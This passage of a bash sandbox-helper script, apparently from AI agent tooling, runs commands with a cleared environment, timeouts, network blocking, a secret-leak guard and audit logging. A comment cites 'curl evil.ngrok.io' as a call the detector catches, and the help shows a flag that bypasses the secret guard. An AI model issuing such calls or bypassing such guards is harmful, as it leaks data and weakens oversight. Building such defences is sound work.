# watchdog on /full-loop + opencode and counts it as a second active worker for
# the same issue — causing duplicate dispatch, git conflicts, and inflated
# struggle ratios (GH#6538).
#
# The watchdog body is sourced from the parent script so all helper functions
# (_sandbox_get_proc_starttime, log_sandbox, etc.) are available in the child.
# BASH_SOURCE[0] is the canonical path to this script file.
#
# Arguments: same as _sandbox_spawn_watchdog ($1-$5)
# Returns: 0 always (background job; caller captures PID via $!)
_sandbox_spawn_watchdog_bg() {
	local bg_timeout="$1"
	local bg_pid="$2"
	local bg_pgid="$3"
	local bg_start_token="$4"
	local bg_marker="$5"
	local bg_script="${BASH_SOURCE[0]}"

	# exec replaces the subshell's process image. The resulting process shows
	# as "bash -c <body> sandbox-watchdog <args>" in ps — no sandbox-exec-helper.sh,
	# no opencode, no /full-loop — so worker-counting filters skip it.
	(
		exec bash --norc --noprofile -c '
			script="$1"; shift
			# shellcheck source=/dev/null
			source "$script" 2>/dev/null || true
			_sandbox_spawn_watchdog "$@"
		' sandbox-watchdog "$bg_script" "$bg_timeout" "$bg_pid" "$bg_pgid" "$bg_start_token" "$bg_marker"
	) &
	return 0
}

# Build the env -i argument list for sandboxed execution.
# Appends to the caller's env_args array (visible via bash dynamic scoping).
# Arguments:
#   $1 - exec_tmpdir path (used to set TMPDIR)
#   $2 - extra_passthrough (comma-separated list of additional env var names)
# Caller must declare: local -a env_args=() before calling this function.
_sandbox_build_env_args() {
	local exec_tmpdir="$1"
	local extra_passthrough="$2"

	# Seed with env -i to clear the environment
	env_args=("env" "-i")

	# Add default passthrough vars (only if they exist in current env)
	local var
	for var in $DEFAULT_PASSTHROUGH; do
		if [[ -n "${!var:-}" ]]; then
			env_args+=("${var}=${!var}")
		fi
	done

	# Override TMPDIR to isolated directory
	env_args+=("TMPDIR=${exec_tmpdir}")

	# Add extra passthrough vars (comma-separated list)
	if [[ -n "$extra_passthrough" ]]; then
		local extra_var
		while IFS= read -r extra_var; do
			# trim whitespace
			extra_var="${extra_var#"${extra_var%%[![:space:]]*}"}"
			extra_var="${extra_var%"${extra_var##*[![:space:]]}"}"
			if [[ -n "${!extra_var:-}" ]]; then
				env_args+=("${extra_var}=${!extra_var}")
			else
				log_sandbox "WARN" "Passthrough var '${extra_var}' not set in environment, skipping"
			fi
		done < <(printf '%s\n' "$extra_passthrough" | tr ',' '\n')
	fi
	return 0
}

# Dispatch the sandboxed command via _sandbox_exec_with_pgkill.
# Handles optional macOS seatbelt network blocking.
# Arguments:
#   $1 - block_network (true|false)
#   $2 - timeout_secs
#   $3 - stdout_file
#   $4 - stderr_file
# Remaining args: env_args elements followed by "--" followed by cmd_args elements.
# Caller passes: "${env_args[@]}" "--" "${cmd_args[@]}"
_sandbox_run_dispatch() {
	local block_network="$1"
	local timeout_secs="$2"
	local stdout_file="$3"
	local stderr_file="$4"
	shift 4
	local dispatch_exit=0

	# Split remaining args into env_args and cmd_args at the "--" separator
	local -a d_env_args=()
	local -a d_cmd_args=()
	local past_sep=false
	local arg
	for arg in "$@"; do
		if [[ "$past_sep" == false ]] && [[ "$arg" == "--" ]]; then
			past_sep=true
		elif [[ "$past_sep" == false ]]; then
			d_env_args+=("$arg")
		else
			d_cmd_args+=("$arg")
		fi
	done

	if [[ "$block_network" == true ]] && command -v sandbox-exec &>/dev/null; then
		# macOS seatbelt: deny network access.
		# sandbox-exec accepts program + args directly (no shell wrapper needed).
		local seatbelt_profile="(version 1)(allow default)(deny network*)"
		_sandbox_exec_with_pgkill "$timeout_secs" "$stdout_file" "$stderr_file" \
			sandbox-exec -p "$seatbelt_profile" \
			"${d_env_args[@]}" \
			"${d_cmd_args[@]}" || dispatch_exit=$?
	else
		if [[ "$block_network" == true ]]; then
			log_sandbox "WARN" "Network blocking requested but sandbox-exec not available (non-macOS); proceeding without"
		fi
		_sandbox_exec_with_pgkill "$timeout_secs" "$stdout_file" "$stderr_file" \
			"${d_env_args[@]}" \
			"${d_cmd_args[@]}" || dispatch_exit=$?
	fi

	return "$dispatch_exit"
}

# Handle post-execution steps: timeout warning, output emission, audit log, cleanup.
# Arguments:
#   $1 - exit_code
#   $2 - timeout_secs
#   $3 - stdout_file
#   $4 - stderr_file
#   $5 - command_tainted (true|false)
#   $6 - cmd_str
#   $7 - duration (seconds)
#   $8 - block_network (true|false)
#   $9 - extra_passthrough
_sandbox_run_post_exec() {
	local exit_code="$1"
	local timeout_secs="$2"
	local stdout_file="$3"
	local stderr_file="$4"
	local command_tainted="$5"
	local cmd_str="$6"
	local duration="$7"
	local block_network="$8"
	local extra_passthrough="$9"

	# Handle timeout (exit code 124 from _sandbox_exec_with_pgkill)
	if [[ $exit_code -eq 124 ]]; then
		log_sandbox "WARN" "Command timed out after ${timeout_secs}s"
	fi

	# Output results with redaction and taint-aware handling.
	# In --stream-stdout mode, stdout was already sent to the caller in
	# real-time (not captured to file), so skip its emission here.
	if [[ "${stream_stdout:-false}" != "true" ]]; then
		_sandbox_emit_redacted_output "$stdout_file" "stdout" "$command_tainted"
	fi
	_sandbox_emit_redacted_output "$stderr_file" "stderr" "$command_tainted"

	# Audit log
	log_execution "$cmd_str" "$exit_code" "$duration" "$timeout_secs" "$block_network" "$extra_passthrough"

	# Async cleanup of old temp dirs (older than 60 minutes).
	# stderr is not suppressed so permission errors or other persistent failures
	# remain visible for debugging rather than silently consuming disk space.
	find "$SANDBOX_TMP_BASE" -maxdepth 1 -type d -mmin +60 -exec rm -rf {} + &

	return 0
}

# Check the secret IO guard for a command string.
# Returns 0 (proceed) or 126 (blocked). Logs and records the blocked execution.
# Arguments:
#   $1 - secret_io_guard (true|false)
#   $2 - allow_secret_io (true|false)
#   $3 - cmd_str
#   $4 - timeout_secs
#   $5 - block_network (true|false)
#   $6 - extra_passthrough
_sandbox_run_check_secret_guard() {
	local secret_io_guard="$1"
	local allow_secret_io="$2"
	local cmd_str="$3"
	local timeout_secs="$4"
	local block_network="$5"
	local extra_passthrough="$6"

	if [[ "$secret_io_guard" == "true" ]] && [[ "$allow_secret_io" != "true" ]]; then
		local block_reason
		if block_reason="$(_sandbox_secret_block_reason "$cmd_str")"; then
			log_sandbox "ERROR" "Blocked command due to secret leak risk: ${block_reason}"
			log_sandbox "ERROR" "Use --allow-secret-io only for explicit user-approved local operations"
			log_execution "$cmd_str" 126 0 "$timeout_secs" "$block_network" "$extra_passthrough"
			return 126
		fi
	fi
	return 0
}

# Run pre-execution checks: log intent, run network tiering, detect taint.
# Prints "true" or "false" to stdout to indicate whether the command is tainted.
# Arguments:
#   $1 - cmd_str
#   $2 - timeout_secs
#   $3 - block_network (true|false)
#   $4 - network_tiering (true|false)
#   $5 - worker_id
_sandbox_run_pre_exec() {
	local cmd_str="$1"
	local timeout_secs="$2"
	local block_network="$3"
	local network_tiering="$4"
	local worker_id="$5"

	log_sandbox "INFO" "Executing (timeout=${timeout_secs}s, network_blocked=${block_network}, tiering=${network_tiering}): ${cmd_str:0:200}"

	# Network tiering pre-check (t1412.3): extract domains from the command
	# and check them against the tier classification before execution.
	# This is a best-effort heuristic — it catches obvious cases like
	# "curl evil.ngrok.io" but cannot intercept runtime DNS resolution.
	# The primary value is logging + post-session review, not hard blocking.
	if [[ "$network_tiering" == true ]] && [[ -x "$NET_TIER_HELPER" ]]; then
		_sandbox_check_network_tiers "$cmd_str" "$worker_id"
	fi

	local command_tainted=false
	if _sandbox_is_secret_tainted_command "$cmd_str"; then
		command_tainted=true
	fi
	printf '%s' "$command_tainted"
	return 0
}

# Parse sandbox_run flags into caller-scoped variables (bash dynamic scoping).
# Caller must declare all target variables as local before calling this function:
#   timeout_secs, block_network, network_tiering, allow_secret_io,
#   worker_id, extra_passthrough, stream_stdout, cmd_args (array).
# Returns 0 on success, 1 if no command was provided after flag parsing.
_sandbox_run_parse_args() {
	while [[ $# -gt 0 ]]; do
		case $1 in
		--timeout)
			timeout_secs="$2"
			if ((timeout_secs > SANDBOX_MAX_TIMEOUT)); then
				log_sandbox "WARN" "Timeout capped at ${SANDBOX_MAX_TIMEOUT}s (requested ${timeout_secs}s)"
				timeout_secs=$SANDBOX_MAX_TIMEOUT
			fi
			shift 2
			;;
		--no-network)
			block_network=true
			shift
			;;
		--network-tiering)
			network_tiering=true
			shift
			;;
		--allow-secret-io)
			allow_secret_io=true
			shift
			;;
		--worker-id)
			worker_id="$2"
			shift 2
			;;
		--passthrough)
			extra_passthrough="$2"
			shift 2
			;;
		--stream-stdout)
			stream_stdout=true
			shift
			;;
		--)
			shift
			cmd_args=("$@")
			return 0
			;;
		*)
			cmd_args=("$@")
			return 0
			;;
		esac
	done
	return 0
}

sandbox_run() {
	local timeout_secs="$SANDBOX_DEFAULT_TIMEOUT"
	local block_network=false
	local network_tiering=false
	local allow_secret_io=false
	local worker_id="sandbox-$$"
	local extra_passthrough=""
	local secret_io_guard="${AIDEVOPS_BLOCK_SECRET_IO:-$SECRET_IO_GUARD_DEFAULT}"
	# Stream stdout mode (GH#15180 bug #4): when true, child stdout flows to
	# the caller's stdout in real-time instead of being captured to a file and
	# replayed after exit. This allows external watchdogs (e.g., the headless
	# activity watchdog) to monitor output as it's produced. Stderr is still
	# captured. Post-exec stdout emission is skipped (already streamed).
	local stream_stdout=false
	# cmd_args is an array — preserves spaces, avoids bash -c eval risks
	local -a cmd_args=()

	_sandbox_run_parse_args "$@"

	if [[ ${#cmd_args[@]} -eq 0 ]]; then
		log_sandbox "ERROR" "No command provided"
		return 1
	fi

	# Space-joined string for pattern-matching helpers (no execution)
	local cmd_str="${cmd_args[*]}"

	_sandbox_run_check_secret_guard \
		"$secret_io_guard" "$allow_secret_io" "$cmd_str" \
		"$timeout_secs" "$block_network" "$extra_passthrough" || return $?

	# Create isolated temp directory
	local exec_id
	exec_id="$(date +%s)-$$"
	local exec_tmpdir="${SANDBOX_TMP_BASE}/${exec_id}"
	mkdir -p "$exec_tmpdir"

	local -a env_args=()
	_sandbox_build_env_args "$exec_tmpdir" "$extra_passthrough"

	local stdout_file="${exec_tmpdir}/stdout"
	local stderr_file="${exec_tmpdir}/stderr"
	local command_tainted
	command_tainted="$(_sandbox_run_pre_exec \
		"$cmd_str" "$timeout_secs" "$block_network" "$network_tiering" "$worker_id")"

	local start_time exit_code=0
	start_time="$(date +%s)"

	_sandbox_run_dispatch \
		"$block_network" "$timeout_secs" "$stdout_file" "$stderr_file" \
		"${env_args[@]}" "--" "${cmd_args[@]}" || exit_code=$?

	local end_time duration
	end_time="$(date +%s)"
	duration=$((end_time - start_time))

	_sandbox_run_post_exec \
		"$exit_code" "$timeout_secs" "$stdout_file" "$stderr_file" \
		"$command_tainted" "$cmd_str" "$duration" "$block_network" "$extra_passthrough"

	return "$exit_code"
}

# =============================================================================
# Audit
# =============================================================================

sandbox_audit() {
	local last_n=20

	while [[ $# -gt 0 ]]; do
		case $1 in
		--last)
			last_n="$2"
			shift 2
			;;
		*) shift ;;
		esac
	done

	if [[ ! -f "$SANDBOX_LOG" ]]; then
		echo "No sandbox executions logged yet."
		return 0
	fi

	echo "Last ${last_n} sandboxed executions:"
	echo "---"
	# Single jq call per line extracts all four fields at once via @tsv,
	# replacing four separate jq invocations and significantly reducing overhead
	# for large log files.
	tail -n "$last_n" "$SANDBOX_LOG" | while IFS= read -r line; do
		local ts cmd exit_code duration
		IFS=$'\t' read -r ts cmd exit_code duration < <(
			printf '%s' "$line" | jq -r '[.ts, .cmd, .exit, .duration_s] | map(. // "?") | @tsv'
		)
		# Truncate command display to 80 chars
		cmd="${cmd:0:80}"
		printf '%s  exit=%s  %ss  %s\n' "$ts" "$exit_code" "$duration" "$cmd"
	done
	return 0
}

# =============================================================================
# Config
# =============================================================================

sandbox_config() {
	echo "Sandbox configuration:"
	echo "  Log:          ${SANDBOX_LOG}"
	echo "  Tmp base:     ${SANDBOX_TMP_BASE}"
	echo "  Timeout:      ${SANDBOX_DEFAULT_TIMEOUT}s (max ${SANDBOX_MAX_TIMEOUT}s)"
	echo "  Max output:   $((SANDBOX_MAX_OUTPUT_BYTES / 1048576))MB per stream"
	echo "  Secret guard: ${AIDEVOPS_BLOCK_SECRET_IO:-$SECRET_IO_GUARD_DEFAULT}"
	echo "  Passthrough:  ${DEFAULT_PASSTHROUGH}"
	echo "  Net tiering:  $([ -x "$NET_TIER_HELPER" ] && echo "available" || echo "not found")"
	echo ""
	if [[ -f "$SANDBOX_LOG" ]]; then
		local count
		count="$(wc -l <"$SANDBOX_LOG" | xargs)"
		echo "  Executions logged: ${count}"
	else
		echo "  Executions logged: 0"
	fi
}

# =============================================================================
# Help
# =============================================================================

sandbox_help() {
	cat <<'HELP'
sandbox-exec-helper.sh — Lightweight execution sandbox

Commands:
  run command [args...]      Execute command in sandboxed environment
  audit [--last N]           Show recent sandboxed executions
  config --show              Show sandbox configuration
  help                       Show this help

Run options:
  --timeout N                Timeout in seconds (default: 120, max: 3600)
  --no-network               Block network access (macOS only, uses seatbelt)
  --network-tiering          Enable domain classification and logging (t1412.3)
  --allow-secret-io          Bypass secret-output guard for this command only
  --worker-id ID             Worker identifier for network tier logs
  --passthrough "VAR1,VAR2"  Additional env vars to pass through

  Command and its arguments are passed as separate shell words — not a single
  quoted string. This correctly handles arguments containing spaces and avoids
  shell injection via bash -c evaluation.

Examples:
  sandbox-exec-helper.sh run ls -la /tmp
  sandbox-exec-helper.sh run --timeout 60 npm test
  sandbox-exec-helper.sh run --no-network python3 script.py
  sandbox-exec-helper.sh run --network-tiering --worker-id w123 curl https://api.github.com/repos
  sandbox-exec-helper.sh run --allow-secret-io gopass show aidevops/EXAMPLE
  sandbox-exec-helper.sh run --passthrough "GITHUB_TOKEN" gh pr list
  sandbox-exec-helper.sh audit --last 10

Security model:
  - Environment cleared (env -i) with minimal passthrough
  - Each execution gets isolated TMPDIR
  - Configurable timeout with hard kill
  - Secret-output command guard blocks likely credential leakage patterns
  - Optional network blocking (macOS seatbelt)
  - Network domain tiering: classify, log, flag unknown domains (t1412.3)
  - All executions logged to JSONL audit trail (jq-safe JSON, injection-proof)
  - Output capped at 10MB per stream
HELP
	return 0
}

# =============================================================================
# Main
# =============================================================================

main() {
	local cmd="${1:-help}"
	shift || true

	case "$cmd" in
	run) sandbox_run "$@" ;;
	audit) sandbox_audit "$@" ;;
	config) sandbox_config "$@" ;;
	help) sandbox_help ;;
	*)
		log_sandbox "ERROR" "Unknown command: ${cmd}"
		sandbox_help
		return 1
		;;
	esac
}

# Source guard: only call main() when executed directly, not when sourced.
# This prevents the secondary watchdog (_sandbox_spawn_watchdog_bg) from
# triggering help output when it sources this script to load helper functions.
# Without this guard, sourcing the script would call main() with the watchdog's
# positional args (e.g., a numeric timeout), which falls through to the *)
# case in main() → sandbox_help() → help text printed to the sandbox's stdout
# pipe → contaminating the opencode output file → output_has_activity() returns
# "0" → headless-runtime-helper.sh records a backoff and never launches the
# worker. This was the root cause of GH#6617. (GH#6550)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
	main "$@"
fi
